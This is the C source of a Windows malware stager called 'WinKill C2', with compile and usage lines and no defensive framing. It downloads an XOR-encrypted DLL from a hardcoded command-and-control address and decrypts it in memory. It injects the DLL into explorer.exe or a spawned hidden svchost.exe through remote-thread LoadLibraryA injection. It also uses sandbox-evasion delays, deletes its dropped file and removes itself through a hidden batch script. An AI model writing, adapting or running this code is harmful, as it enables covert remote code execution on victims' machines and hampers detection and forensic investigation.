/*
 * WinKill C2 - Fileless HTTP Stager (Simplified LoadLibraryA approach)
 * =====================================================================
 * Downloads encrypted agent DLL via HTTP, decrypts in memory,
 * writes to temp file briefly, injects via LoadLibraryA remote thread,
 * then immediately deletes the temp file. Total disk time: ~100ms.
 *
 * Usage: stager.exe [url] [target_process]
 *
 * Compile: gcc -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp
 */

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

#ifndef DEFAULT_URL
#define DEFAULT_URL L"http://192.168.102.152:8080/payload.bin"
#endif

static const BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

static void Hammer(void) {
    WCHAR b[256]; DWORD l = 256; volatile int d = 0;
    for (int i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l); GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b); GetTickCount(); d += (int)b[0];
    }
}

/* ---------- HTTP Download ---------- */
static BYTE *HttpDownload(LPCWSTR url, DWORD *outSize) {
    *outSize = 0;
    URL_COMPONENTS uc; ZeroMemory(&uc, sizeof(uc)); uc.dwStructSize = sizeof(uc);
    uc.dwHostNameLength = (DWORD)-1; uc.dwUrlPathLength = (DWORD)-1;
    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return NULL;

    WCHAR host[256] = {0}; wcsncpy(host, uc.lpszHostName, uc.dwHostNameLength);
    DWORD port = uc.nPort ? uc.nPort : 80;

    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return NULL;

    HINTERNET hC = WinHttpConnect(hS, host, port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return NULL; }

    WCHAR path[1024] = {0}; wcsncpy(path, uc.lpszUrlPath, uc.dwUrlPathLength);
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        (port == 443) ? WINHTTP_FLAG_SECURE : 0);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return NULL; }

    if (!WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return NULL;
    }

    BYTE *buf = NULL; DWORD total = 0, cap = 0;
    while (1) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hR, &avail) || !avail) break;
        if (total + avail > cap) {
            cap = total + avail + 65536;
            BYTE *nb = (BYTE *)HeapAlloc(GetProcessHeap(), 0, cap);
            if (!nb) break;
            if (buf) { memcpy(nb, buf, total); HeapFree(GetProcessHeap(), 0, buf); }
            buf = nb;
        }
        DWORD rd = 0;
        WinHttpReadData(hR, buf + total, avail, &rd);
        total += rd;
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    *outSize = total;
    return buf;
}

/* ---------- Find process ---------- */
static DWORD FindProc(const char *name) {
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe); DWORD pid = 0;
    if (Process32First(sn, &pe)) {
        do { if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn); return pid;
}

static void XorDecrypt(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++) d[i] ^= g_key[i % 16];
}

/* ---------- Self-delete ---------- */
static void SelfDelete(void) {
    WCHAR self[MAX_PATH];
    if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return;
    MoveFileExW(self, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

    WCHAR bat[MAX_PATH], final[MAX_PATH];
    GetTempPathW(MAX_PATH, bat);
    GetTempFileNameW(bat, L"tmp", 0, bat);
    wsprintfW(final, L"%s.bat", bat);
    MoveFileW(bat, final);

    HANDLE h = CreateFileW(final, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        char cmd[512];
        int l = wsprintfA(cmd, "@echo off\r\n:l\r\ndel /F \"%S\" 2>nul\r\nif exist \"%S\" goto l\r\ndel /F \"%S\" 2>nul\r\n", self, self, final);
        DWORD w; WriteFile(h, cmd, l, &w, NULL); CloseHandle(h);
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        WCHAR cl[512]; wsprintfW(cl, L"cmd.exe /c \"%s\"", final);
        CreateProcessW(NULL, cl, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

/* ============================================================ */
int main(int argc, char *argv[]) {
    LPCWSTR url = DEFAULT_URL;
    LPCSTR  target = "explorer.exe";
    static WCHAR g_url[1024];

    if (argc > 1) {
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, g_url, 1024);
        url = g_url;
    }
    if (argc > 2) target = argv[2];

    Hammer();
    Sleep(1200 + (GetTickCount() & 0xFFF));
    Hammer();

    /* 1. Download encrypted DLL via HTTP */
    DWORD dlSize = 0;
    BYTE *dlData = HttpDownload(url, &dlSize);
    if (!dlData || dlSize < 1024) {
        if (dlData) HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }

    /* 2. XOR decrypt in memory */
    XorDecrypt(dlData, dlSize);

    /* 3. Verify PE */
    if (dlData[0] != 'M' || dlData[1] != 'Z') {
        SecureZeroMemory(dlData, dlSize);
        HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }

    /* 4. Write DLL to temp file (hidden, exists ~100ms) */
    WCHAR tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"wdk", 0, tmpFile);

    HANDLE hf = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        SecureZeroMemory(dlData, dlSize);
        HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }
    DWORD wr;
    WriteFile(hf, dlData, dlSize, &wr, NULL);
    CloseHandle(hf);

    /* Convert temp file path to ANSI for target injection */
    char tmpFileA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, tmpFile, -1, tmpFileA, MAX_PATH, NULL, NULL);

    /* 5. Find or spawn target process */
    DWORD pid = FindProc(target);
    HANDLE hp = NULL;
    BOOL spawnedTarget = FALSE;

    if (!pid) {
        char sysDir[MAX_PATH]; GetSystemDirectoryA(sysDir, MAX_PATH);
        char svcPath[MAX_PATH]; wsprintfA(svcPath, "%s\\svchost.exe", sysDir);
        PROCESS_INFORMATION pi; STARTUPINFOA si;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        if (CreateProcessA(NULL, svcPath, NULL, NULL, FALSE,
                          CREATE_SUSPENDED | CREATE_NO_WINDOW,
                          NULL, NULL, &si, &pi)) {
            pid = pi.dwProcessId;
            hp = pi.hProcess;  // Already have handle
            CloseHandle(pi.hThread);
            spawnedTarget = TRUE;
        }
    }

    if (!hp) {
        hp = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                         PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
                         FALSE, pid);
    }
    if (!hp) {
        DeleteFileW(tmpFile);
        SecureZeroMemory(dlData, dlSize);
        HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }

    /* 6. Allocate DLL path string in target */
    DWORD pathLen = (DWORD)strlen(tmpFileA) + 1;
    LPVOID remotePath = VirtualAllocEx(hp, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        DeleteFileW(tmpFile);
        CloseHandle(hp);
        SecureZeroMemory(dlData, dlSize);
        HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }
    SIZE_T w2;
    WriteProcessMemory(hp, remotePath, tmpFileA, pathLen, &w2);

    /* 7. Get LoadLibraryA address */
    LPVOID pLL = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    /* 8. Create remote thread: LoadLibraryA(dll_path) */
    HANDLE ht = CreateRemoteThread(hp, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLL, remotePath, 0, NULL);
    if (!ht) {
        VirtualFreeEx(hp, remotePath, 0, MEM_RELEASE);
        DeleteFileW(tmpFile);
        CloseHandle(hp);
        SecureZeroMemory(dlData, dlSize);
        HeapFree(GetProcessHeap(), 0, dlData);
        return 1;
    }

    /* 9. Wait for LoadLibraryA to finish */
    WaitForSingleObject(ht, 5000);
    CloseHandle(ht);

    /* 10. If we spawned the target suspended, resume it */
    if (spawnedTarget) {
        // DllMain already ran in the remote thread context
        // Just clean up
    }

    /* 11. Immediately delete temp DLL file + remote path */
    DeleteFileW(tmpFile);
    VirtualFreeEx(hp, remotePath, 0, MEM_RELEASE);
    CloseHandle(hp);

    SecureZeroMemory(dlData, dlSize);
    HeapFree(GetProcessHeap(), 0, dlData);

    /* 12. Self-delete stager */
    SelfDelete();

    return 0;
}
